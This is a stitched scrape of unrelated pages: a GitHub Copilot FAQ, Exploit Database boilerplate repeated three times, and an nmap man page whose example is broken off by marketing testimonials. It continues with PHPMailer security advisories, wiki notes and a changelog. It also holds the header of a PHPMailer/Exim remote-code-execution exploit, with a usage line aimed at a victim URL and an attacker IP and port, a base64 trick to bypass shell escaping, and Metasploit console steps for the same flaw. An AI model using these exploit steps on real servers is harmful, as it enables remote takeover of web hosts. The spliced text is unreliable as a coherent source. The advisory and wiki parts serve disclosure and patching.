* If a suggestion is capable of being owned, our terms are clear: GitHub does not claim ownership.
* GitHub does not claim ownership of any suggestion. In certain cases, it is possible for Copilot to produce similar suggestions to different users. For example, two unrelated users both starting new files to code the quicksort algorithm in Java will likely get the same suggestion. The possibility of providing similar suggestions to multiple users is a common part of generative AI systems.

#### Can GitHub Copilot introduce insecure code in its suggestions?

Public code may contain insecure coding patterns, bugs, or references to outdated APIs or idioms. When GitHub Copilot synthesizes code suggestions based on this data, it can also synthesize code that contains these undesirable patterns. Copilot has filters in place that either block or notify users of insecure code patterns that are detected in Copilot suggestions. These filters target the most common vulnerable coding patterns, including [hardcoded credentials](https://cwe.mitre.org/data/definitions/798.html), [SQL injections](https://cwe.mitre.org/data/definitions/89.html), and [path injections](https://cwe.mitre.org/data/definitions/22.html). Additionally, in recent years we’ve provided tools such as GitHub Advanced Security, GitHub Actions, Dependabot, and CodeQL to open source projects to help improve code quality. Of course, you should always use GitHub Copilot together with good testing and code review practices and security tools, as well as your own judgment.

#### Is GitHub Copilot intended to fully automate code generation and replace developers?

No. Copilot is a tool intended to make developers more efficient. It’s not intended to replace developers, who should continue to apply the same sorts of safeguards and diligence they would apply with regard to any third-party code of unknown origin.

* The product is called “Copilot” not “Autopilot” and it’s not intended to generate code without oversight. You should use exactly the same sorts of safeguards and diligence with Copilot’s suggestions as you would use with any third-party code.
* Identifying best practices for use of third party code is beyond the scope of this section. That said, whatever practices your organization currently uses – rigorous functionality testing, code scanning, security testing, etc. – you should continue these policies with Copilot’s suggestions. Moreover, you should make sure your code editor or editor does not automatically compile or run generated code before you review it.

#### Can GitHub Copilot users simply use suggestions without concern?

Not necessarily. GitHub Copilot users should align their use of Copilot with their respective risk tolerances.

* As noted above, GitHub Copilot is not intended to replace developers, or their individual skill and judgment, and is not intended to fully automate the process of code development. The same risks that apply to the use of any third-party code apply to the use of Copilot’s suggestions.
* Depending on your particular use case, you should consider implementing the protections discussed above. It is your responsibility to assess what is appropriate for the situation and implement appropriate safeguards.
* You’re entitled to IP indemnification from GitHub for the unmodified suggestions when Copilot’s filtering is enabled. If you do elect to enable this feature, the copyright responsibility is ours, not our customers. As part of our ongoing commitment to responsible AI, GitHub and Microsoft extends our IP indemnity and protection support to our customers who are empowering their teams with GitHub Copilot. See [Microsoft's Copilot Copyright Commitment](https://blogs.microsoft.com/on-the-issues/2023/09/07/copilot-copyright-commitment-ai-legal-concerns/) for more details.

#### Does GitHub Copilot support accessibility features?

We are conducting internal testing of GitHub Copilot’s ease of use by developers with disabilities and working to ensure that GitHub Copilot is accessible to all developers. Please feel free to share your feedback on GitHub Copilot accessibility in our [feedback forum](https://github.com/github-community/community/discussions/categories/copilot).

#### Does GitHub Copilot produce offensive outputs?

GitHub Copilot includes filters to block offensive language in the prompts and to avoid synthesizing suggestions in sensitive contexts. We continue to work on improving the filter system to more intelligently detect and remove offensive outputs. If you see offensive outputs, please report them directly to copilot-safety@github.com so that we can improve our safeguards. GitHub takes this challenge very seriously and we are committed to addressing it.

#### Will GitHub Copilot work as well using languages other than English?

Given public sources are predominantly in English, GitHub Copilot will likely work less well in scenarios where natural language prompts provided by the developer are not in English and/or are grammatically incorrect. Therefore, non-English speakers might experience a lower quality of service.

#### What data has GitHub Copilot been trained on?

GitHub Copilot is powered by generative AI models developed by GitHub, OpenAI, and Microsoft. It has been trained on natural language text and source code from publicly available sources, including code in public repositories on GitHub.

1. Data from June 2023. Additional research can be found [here](https://github.blog/news-insights/research/the-economic-impact-of-the-ai-powered-developer-lifecycle-and-lessons-from-github-copilot/).

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

## Name

nmap — Network exploration tool and security / port scanner

## Synopsis

`nmap` [
*`<Scan Type>`*
...] [
*`<Options>`*
] {
*`<target specification>`*
}

## Description

| [Note] | Note |
| --- | --- |
| This document describes the very latest version of Nmap available from [`https://nmap.org/download.html`](https://nmap.org/download.html) or [`https://nmap.org/dist/?C=M&O=D`](https://nmap.org/dist/?C=M&O=D). Please ensure you are using the latest version before reporting that a feature doesn't work as described. |

Nmap (“Network Mapper”) is an open source tool for network
exploration and security auditing. It was designed to rapidly
scan large networks, although it works fine against single
hosts. Nmap uses raw IP packets in novel ways to determine what
hosts are available on the network, what services (application
name and version) those hosts are offering, what operating systems
(and OS versions) they are running, what type of packet
filters/firewalls are in use, and dozens of other
characteristics. While Nmap is commonly used for security audits,
many systems and network administrators find it useful for routine
tasks such as network inventory, managing service upgrade
schedules, and monitoring host or service uptime.

The output from Nmap is a list of scanned targets, with
supplemental information on each depending on the options
used. Key among that information is the “interesting ports
table”.
That table lists the port number and protocol,
service name, and state. The state is either
`open`, `filtered`,
`closed`, or `unfiltered`.
`Open`
means that an application on the target machine is listening for
connections/packets on that port.
`Filtered`
means that a firewall, filter, or other network
obstacle is blocking the port so that Nmap cannot tell whether it is
`open` or `closed`.
`Closed`
ports have no application listening on them,
though they could open up at any time.
Ports are classified as
`unfiltered`
when they are
responsive to Nmap's probes, but Nmap cannot determine whether they are
open or closed.
Nmap reports the state combinations
`open|filtered`
and `closed|filtered`
when it cannot determine which
of the two states describe a port. The port table may also
include software version details when version detection has been
requested. When an IP protocol scan is requested
(`-sO`), Nmap provides information on supported IP
protocols rather than listening ports.

In addition to the interesting ports table, Nmap can provide
further information on targets, including reverse DNS names,
operating system guesses, device types, and MAC addresses.

A typical Nmap scan is shown in [Example 15.1](man.html#man-ex-repscan "Example 15.1. A representative Nmap scan"). The only Nmap arguments used in
this example are `-A`, to enable OS and version
detection, script scanning, and traceroute; `-T4` for
faster execution; and then the hostname.

Example 15.1. A representative Nmap scan
```
# nmap -A -T4 scanme.nmap.org

     ![Duane LaFlotte](/_astro/duane.CAyBZp_-.png)
### Duane LaFlotte

CTO, Pulsar Security

  I feel like every person's first experience in cybersecurity should be OffSec. Before you go out to figure out how to create a zero-day and you get confused, if you start with OffSec, that won't happen due to how methodologically all the training is put together.      ![Emile Kok](/_astro/emile.C3f2EqfQ.png)
### Emile Kok

Founder and Managing Director, TSTC Institute

  When going to the real world, you have to know what you're doing and understand what is expected from you on the job. For us, OffSec is the champion in this league in educating and preparing learners.      ![Douglas Costa](/_astro/douglas.BdxOPM2d.png)

# http://pwnscriptum.com/
#
# --------------------------------------------------------
# Enhanced for Exim MTA
#
# N.B:
# The original author's method in the PHPMailer POC (for sendmail MTA) uses the RFC 3696
# double quotes technique associated with the -oQ -X options to log mailer traffic and to create
# the backdoor. This technique is not facing some payload size issues because the payload
# was in the email body.
#
# For Exim:
# The original author's Wordpress 4.6 POC for Exim combines the comment syntax (RFC 822)
# and the Exim expansion mode techniques. The use of substr on spool_directory and tod_log
# expansion variables in order to bypass the PHP mail() escaping may leads to large
# email addresses payloads. However the comment syntax validateAddress() technique does not
# face any size limitation but its use can not be applied for PHPMailer < 5.2.20.
#
# Goal:
# The use of double quotes validateAdresse() technique (and it's patch bypass for PHPMailer < 5.5.20)
# combined with the Exim expansion mode technique may leads to large payloads quickly facing addresses
# size limit here (260 chars) and so not matching the pcre8 regexp in the validateAddress() function.
# We are now base64 encoding the command in order to bypass escapeshellcmd() and allowing larger payloads.
#
#
# Usage:
# ./rce_phpmailer_exim4.py -url http://victim/phpmailer/ -cf contact_form.php -ip 192.168.1.109 -p 1337
#
#
# Requirements:
# - Vulnerable PHP libraries
# - Exim MTA Agent

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

## [20161205] - PHPMailer Security Advisory

* **Project:** Joomla!
* **Severity:** High
* **Versions:** 1.5.0 through 3.6.5
* **Exploit type:** Remote Code Execution in third-party PHPMailer library
* **CVE Numbers:** [CVE-2016-10033](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-10033) and [CVE-2016-10045](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-10045)

**Note:** This advisory was revised to reflect the addition of CVE-2016-10045 and the PHPMailer 5.2.20 release
### Description

All versions of the third-party PHPMailer library distributed with Joomla! versions up to 3.6.5 are vulnerable to a remote code execution vulnerability. This is patched in PHPMailer 5.2.20 which will be included with Joomla! 3.7. After analysis, the JSST has determined that through correct use of the JMail class, there are additional validations in place which make executing this vulnerability impractical within the Joomla environment. As well, the vulnerability requires being able to pass user input to a message's "from" address; all places in the core Joomla API which send mail use the sender address set in the global configuration and does not allow for user input to be set elsewhere. However, extensions which bundle a separate version of PHPMailer or do not use the Joomla API to send email may be vulnerable to this issue.

Generally, the Joomla project does not issue advisories regarding third party libraries, however given the severity of this issue we felt it important to advise our users that we are aware of this issue and we have determined that the additional validations in our API prevent triggering this vulnerability.

### Affected Installs

Joomla! CMS versions 1.5.0 through 3.6.5

### Solution

No action required for Joomla users, the updated library will be included in the next scheduled release and additional mechanisms exist in Joomla core to prevent triggering the vulnerability. Users of the PHPMailer library separate from Joomla are advised to upgrade to 5.2.20 or newer ASAP.

 [Back to Search](https://www.rapid7.com/db/)

### PHPMailer Sendmail Argument Injection

Disclosed
12/26/2016

Created
05/30/2018

#### Description

PHPMailer versions up to and including 5.2.19 are affected by a
vulnerability which can be leveraged by an attacker to write a file with
partially controlled contents to an arbitrary location through injection
of arguments that are passed to the sendmail binary. This module
writes a payload to the web root of the webserver before then executing
it with an HTTP request. The user running PHPMailer must have write
access to the specified WEB\_ROOT directory and successful exploitation
can take a few minutes.

#### Author(s)

* Dawid Golunski
* Spencer McIntyre

#### Platform

PHP

#### Architectures

php

#### Development

* [Source Code](https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/multi/http/phpmailer_arg_injection.rb)
* [History](https://github.com/rapid7/metasploit-framework/commits/master//modules/exploits/multi/http/phpmailer_arg_injection.rb)

#### Module Options

To display the available options, load the module within the Metasploit console and run the commands 'show options' or 'show advanced':

```
msf > use exploit/multi/http/phpmailer_arg_injection
msf exploit(phpmailer_arg_injection) > show targets
    ...targets...
msf exploit(phpmailer_arg_injection) > set TARGET < target-id >
msf exploit(phpmailer_arg_injection) > show options
    ...show and set options...
msf exploit(phpmailer_arg_injection) > exploit
```

Time is precious, so I don’t want to do something manually that I can automate. Leveraging the Metasploit Framework when automating any task keeps us from having to re-create the wheel as we can use the existing libraries and focus our efforts where it matters.

[13 revisions](/PHPMailer/PHPMailer/wiki/About-the-CVE-2016-10033-and-CVE-2016-10045-vulnerabilities/_history)

On December 16th 2016, a remote code execution vulnerability in PHPMailer was reported by [Dawid Golunski](https://legalhackers.com), and described in an [advisory](http://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html). This vulnerability can occur in the following circumstances:

1. The script is using PHPMailer's default `isMail()` transport, i.e. using PHP's built-in `mail()` function.
2. The 'From' address is set from user input.
3. The `Sender` property is not set explicitly.
4. The server is not running the postfix mail server

In the absence of a preset `Sender` property, it is copied from the from address. This in turn is built into a string, prefixed with `-f` to designate a sender address, and passed into the `$additional_parameters` parameter of the PHP [`mail()` function](http://php.net/manual/en/function.mail.php).

All addresses used by PHPMailer are validated before being used, however, it's possible to construct a valid email address that also constitutes an executable command when passed to the shell via `mail()`.

This vulnerability constitutes [CVE-2016-10033](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2016-10033), and was thought to be resolved by applying [`escapeshellarg()`](http://php.net/manual/en/function.escapeshellarg.php) to the address, and released as PHPMailer 5.2.20, with a subsequent cleanup in [PHPMailer 5.2.21](https://github.com/PHPMailer/PHPMailer/releases/tag/v5.2.21).

#Act II
The documentation for `mail()` mentions that [`escapeshellcmd()`](http://php.net/manual/en/function.escapeshellcmd.php) is applied internally to the command generated by `mail()`, and that 'dangerous' characters should be escaped. Unfortunately this clashes with what `escapeshellarg()` does, and the nested combination of `escapeshellcmd(escapeshellarg($address))` can result in a crafted address breaking out of the escaping, resulting in an executable command again. This was also spotted by Dawid Golunski ([advisory](https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10045-Vuln-Patch-Bypass.html)) and reported as [CVE-2016-10045](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2016-10045). Unhelpfully, an exploit for this was posted on an open mailing list the same day, making this a 0-day vulnerability.

This is a much more insidious problem because it's really a problem with PHP internals, and the only reliable mitigation is to prevent use of valid addresses that might also be exploits, which requires breaking RFC compliance for sender addresses. The `escapeshellcmd` and `escapeshellarg` functions make assumptions about the underlying shell environment (for example what character it uses for escaping, which may not be `\`, or what character set is in use), so their use cannot be considered safe especially across platforms - the only safe route is to apply severe restrictions to the sender address in this context. A patch to this effect was provided by @Zenexer and released in [PHPMailer 5.2.20](https://github.com/PHPMailer/PHPMailer/releases/tag/v5.2.20). @Zenexer also provided [a technical description of the problems surrounding shell escaping in PHP](https://gist.github.com/Zenexer/40d02da5e07f151adeaeeaa11af9ab36).

A proper fix for this would be to rewrite the PHP mail function so that it treats `$additional_parameters` as an array of individual configuration elements that can be processed separately, not a string, or more thoroughly, to not invoke `sendmail` via a shell at all, avoiding escaping issues altogether.

#You're safe if...
You need to be doing one key thing wrong in order to be vulnerable to this attack: using a user-supplied address as the From address, for example:

```
$mail->setFrom($_POST['email']);
```

If you're not doing that, you've nothing to worry about, but unfortunately this is quite a common pattern on naïve 'contact us' forms (see Stack Overflow for many examples) because it means you can reply to the message and it will go directly to the supposed sender. However, this is bad practice because it's forging the from address, and so it will likely fail SPF and DMARC checks and you will have difficulty getting messages delivered. The correct way to do this is along the lines of:

```
$mail->setFrom('contact@example.com'); //Send from a fixed, valid address in your own domain, perhaps one that allows you to easily identify that it originated on your contact form
$mail->addAddress('me@example.com'); //Send to a fixed, valid address in your own domain
$mail->addReplyTo($_POST['email']); //The submitter's address (supposedly) - this is automatically validated before it's accepted so you should check the return value from this function
```

You are also safe if you're using PHPMailer's SMTP transport (i.e. you call `$mail->isSMTP()` in your code), as that transport does not execute shell commands.

You're indirectly protected if you use postfix as your mail server (the default in many Linux distros), because it lacks support for sendmail's `-X` option that permits the creation of executable commands. However, you shouldn't rely on this, as it's possible that other exploits for the same vulnerability will affect postfix.

#Don't think you're safe if...
You're not using PHPMailer? Both of these vulnerabilities occur in other popular PHP email libraries and applications too - for example [Swiftmailer](https://legalhackers.com/advisories/SwiftMailer-Exploit-Remote-Code-Exec-CVE-2016-10074-Vuln.html), [zend\_mail](https://legalhackers.com/advisories/ZendFramework-Exploit-ZendMail-Remote-Code-Exec-CVE-2016-10034-Vuln.html), and [roundcube](https://blog.ripstech.com/2016/roundcube-command-execution-via-email/), and there may be many more.

#How to avoid issues in future?
CVE-2016-10045 particular has enormous implications well beyond PHPMailer, so **check your sources**, and **help their maintainers** spot and fix problems like this before they escape into the wild. There may be other exploits found for `mail()` (keep an eye on [Dawid Golunski's white paper](https://legalhackers.com/papers/Pwning-PHP-mail-func-For-Fun-And-RCE-New-Exploit-Techniques-Vectors.html) on the subject), so the most important thing is to make sure you **stay up to date with *all* your packages**, not just PHPMailer.

## Version 6.5.0 (June 16th, 2021)

* **SECURITY** Fixes CVE-2021-34551, a complex RCE affecting Windows hosts. See [SECURITY.md](/PHPMailer/PHPMailer/blob/master/SECURITY.md) for details.
* The fix for this issue changes the way that language files are loaded. While they remain in the same PHP-like format, they are processed as plain text, and any code in them will not be run, including operations such as concatenation using the `.` operator.
* *Deprecation* The current translation file format using PHP arrays is now deprecated; the next major version will introduce a new format.
* **SECURITY** Fixes CVE-2021-3603 that may permit untrusted code to be run from an address validator. See [SECURITY.md](/PHPMailer/PHPMailer/blob/master/SECURITY.md) for details.
* The fix for this issue includes a minor BC break: callables injected into `validateAddress`, or indirectly through the `$validator` class property, may no longer be simple strings. If you want to inject your own validator, provide a closure instead of a function name.
* Haraka message ID strings are now recognised

## Version 6.4.1 (April 29th, 2021)

* **SECURITY** Fixes CVE-2020-36326, a regression of CVE-2018-19296 object injection introduced in 6.1.8, see SECURITY.md for details
* Reject more file paths that look like URLs, matching RFC3986 spec, blocking URLS using schemes such as `ssh2`
* Ensure method signature consistency in `doCallback` calls
* Ukrainian language update
* Add composer scripts for checking coding standards and running tests

## Version 6.4.0 (March 31st, 2021)

* Revert change that made the `mail()` and sendmail transports set the envelope sender if one isn't explicitly provided, as it causes problems described in [#2298](https://github.com/PHPMailer/PHPMailer/issues/2298)
* Check for mbstring extension before decoding addresss in `parseAddress`
* Add Serbian Latin translation (`sr_latn`)
* Enrol PHPMailer in Tidelift

## Version 6.3.0 (February 19th, 2021)

* Handle early connection errors such as 421 during connection and EHLO states
* Switch to GitHub Actions for CI
* Generate debug output for `mail()`, sendmail, and qmail transports. Enable using the same mechanism as for SMTP: set `SMTPDebug` > 0
* Make the `mail()` and sendmail transports set the envelope sender the same way as SMTP does, i.e. use whatever `From` is set to, only falling back to the `sendmail_from` php.ini setting if `From` is unset. This avoids errors from the `mail()` function if `Sender` is not set explicitly and php.ini is not configured. This is a minor functionality change, so bumps the minor version number.
* Extend `parseAddresses` to decode encoded names, improve tests

## Version 6.2.0

* PHP 8.0 compatibility, many thanks to @jrf\_nl!
* Switch from PHP CS Fixer to PHP CodeSniffer for coding standards
* Create class constants for the debug levels in the POP3 class
* Improve French, Slovenian, and Ukrainian translations
* Improve file upload examples so file extensions are retained
* Resolve PHP 8 line break issues due to a very old PHP bug being fixed
* Avoid warnings when using old openssl functions
* Improve Travis-CI build configuration

## Version 6.1.8 (October 9th, 2020)

* Mark `ext-hash` as required in composer.json. This has long been required, but now it will cause an error at install time rather than runtime, making it easier to diagnose
* Make file upload examples safer
* Update links to SMTP testing servers
* Avoid errors when set\_time\_limit is disabled (you need better hosting!)
* Allow overriding auth settings for local tests; makes it easy to run tests using HELO
* Recover gracefully from errors during keepalive sessions
* Add AVIF MIME type mapping
* Prevent duplicate `To` headers in BCC-only messages when using `mail()`
* Avoid file function problems when attaching files from Windows UNC paths
* Improve German, Bahasa Indonesian, Filipino translations
* Add Javascript-based example
* Increased test coverage

## Version 6.1.7 (July 14th, 2020)

* Split SMTP connection into two separate methods
* Undo BC break in PHP versions 5.2.3 - 7.0.0 introduced in 6.1.2 when injecting callables for address validation and HTML to text conversion
* Save response to SMTP welcome banner as other responses are saved
* Retry stream\_select if interrupted by a signal

## Version 6.1.6 (May 27th, 2020)

* **SECURITY** Fix insufficient output escaping bug in file attachment names. CVE-2020-13625. Reported by Elar Lang of Clarified Security.
* Correct Armenian ISO language code from `am` to `hy`, add mapping for fallback
* Use correct timeout property in debug output

## Version 6.1.5 (March 14th, 2020)

* Reject invalid custom headers that are empty or contain breaks
* Various fixes for DKIM issues, especially when using `mail()` transport
* Drop the `l=` length tag from DKIM signatures; it's a mild security risk

* Check that attachment files are readable both when adding *and* when sending
* Work around Outlook bug in mishandling MIME preamble
* Danish translation improvements

## Version 6.1.4 (December 10th, 2019)

* Clean up hostname handling
* Avoid IDN error on older PHP versions, prep for PHP 8.0
* Don't force RFC2047 folding unnecessarily

* Add `SMTP::MAX_REPLY_LENGTH` constant
* Remove some dev dependencies; phpdoc no longer included
* Fix an issue where non-compliant servers returning bare codes caused an SMTP hang

## Version 6.1.2 (November 13th, 2019)

* Substantial revision of DKIM header generation
* Use shorter hashes for auto-generated CID values
* Fix format of content-id headers, and only use them for inline attachments
* Remove all use of XHTML
* Lots of coding standards cleanup
* API docs are now auto-updated via GitHub actions

## Version 6.1.1 (September 27th 2019)

* Fix misordered version tag

## Version 6.1.0 (September 27th 2019)

* Multiple bug fixes for folding of long header lines, thanks to @caugner

## Version 6.0 (August 28th 2017)

This is a major update that breaks backwards compatibility.

* **Requires PHP 5.5 or later**

* File structure simplified and PSR-4 compatible, classes live in the `src/` folder
* The custom autoloader has been removed: [**use composer**](https://getcomposer.org)!
* Classes & Exceptions renamed to make use of the namespace
* Most statically called functions now use the `static` keyword instead of `self`, so it's possible to override static internal functions in subclasses, for example `validateAddress()`
* Complete RFC standardisation on CRLF (`\r\n`) line breaks for SMTP by default:
  + `PHPMailer:$LE` defaults to CRLF
  + All uses of `PHPMailer::$LE` property converted to use `static::$LE` constant for consistency and ease of overriding
  + Similar changes to line break handling in SMTP and POP3 classes.
  + Line break format for `mail()` transport is set automatically.
  + Warnings emitted for buggy `mail()` in PHP versions 7.0.0 - 7.0.16 and 7.1.0 - 7.1.2; either upgrade or switch to SMTP.
* Extensive reworking of XOAUTH2, adding support for Google, Yahoo and Microsoft providers, thanks to @sherryl4george
* Major cleanup of docs and examples
* All elements previously marked as deprecated have been removed:
  + `PHPMailer->Version` (replaced with `VERSION` constant)
  + `PHPMailer->ReturnPath`
  + `PHPMailer->PluginDir`
  + `PHPMailer->encodeQPphp()`
  + `SMTP->CRLF` (replaced with `LE` constant)

  + `SMTP->SMTP_PORT` (replaced with `DEFAULT_PORT` constant)
  + `POP3->CRLF` (replaced with `LE` constant)
  + `POP3->Version` (replaced with `VERSION` constant)
  + `POP3->POP3_PORT` (replaced with `DEFAULT_PORT` constant)
  + `POP3->POP3_TIMEOUT` (replaced with `DEFAULT_TIMEOUT` constant)
* NTLM authentication has been removed - it never worked anyway!
  + `PHPMailer->Workstation`
  + `PHPMailer->Realm`
* `SingleTo` functionality is deprecated; this belongs at a higher level - PHPMailer is not a mailing list system.
* `SMTP::authenticate` method signature changed
* `parseAddresses()` is now static
* `validateAddress()` is now called statically from `parseAddresses()`
* `idnSupported()` is now static and is called statically from `punyencodeAddress()`

* Don't try to use an auth mechanism if it's not supported by the server
* Reorder automatic AUTH mechanism selector to try most secure method first
* `Extras` classes have been removed - use alternative packages from [packagist.org](https://packagist.org) instead
* Better handling of automatic transfer encoding switch in the presence of long lines
* Simplification of address validation - now uses PHP's `FILTER_VALIDATE_EMAIL` pattern by default, retains advanced options
* `Debugoutput` can accept a PSR-3 logger instance
* To reduce code footprint, the examples folder is no longer included in composer deployments or GitHub zip files
* Trap low-level errors in SMTP, reports via debug output
* More reliable folding of message headers
* Inject your own SMTP implementation via `setSMTPInstance()` instead of having to subclass and override `getSMTPInstance()`.

* This is the last official release in the legacy PHPMailer 5.2 series; there may be future security patches (which will be found in the [5.2-stable branch](https://github.com/PHPMailer/PHPMailer/tree/5.2-stable)), but no further non-security PRs or issues will be accepted. Migrate to PHPMailer 6.0.

## Version 5.2.24 (July 26th 2017)

* **SECURITY** Fix XSS vulnerability in one of the code examples, [CVE-2017-11503](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2017-11503). The `code_generator.phps` example did not filter user input prior to output. This file is distributed with a `.phps` extension, so it is not normally executable unless it is explicitly renamed, so it is safe by default. There was also an undisclosed potential XSS vulnerability in the default exception handler (unused by default). Patches for both issues kindly provided by Patrick Monnerat of the Fedora Project.
* Handle bare codes (an RFC contravention) in SMTP server responses
* Make message timestamps more dynamic - calculate the date separately for each message
* More thorough checks for reading attachments.
* Throw an exception when trying to send a message with an empty body caused by an internal error.
* Replaced all use of MD5 and SHA1 hash functions with SHA256.
* Now checks for invalid host strings when sending via SMTP.
* Include timestamps in HTML-format debug output
* Improve Turkish, Norwegian, Serbian, Brazilian Portuguese & simplified Chinese translations

## Version 5.2.23 (March 15th 2017)

* Improve trapping of TLS errors during connection so that they don't cause warnings, and are reported better in debug output
* Amend test suite so it uses PHPUnit version 4.8, compatible with older versions of PHP, instead of the version supplied by Travis-CI
* This forces pinning of some dev packages to older releases, but should make travis builds more reliable
* Test suite now runs on HHVM, and thus so should PHPMailer in general
* Improve Czech translations
* Add links to CVE-2017-5223 resources

## Version 5.2.22 (January 5th 2017)

* **SECURITY** Fix [CVE-2017-5223](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2017-5223), local file disclosure vulnerability if content passed to `msgHTML()` is sourced from unfiltered user input. Reported by Yongxiang Li of Asiasecurity. The fix for this means that calls to `msgHTML()` without a `$basedir` will not import images with relative URLs, and relative URLs containing `..` will be ignored.
* Add simple contact form example
* Emoji in test content

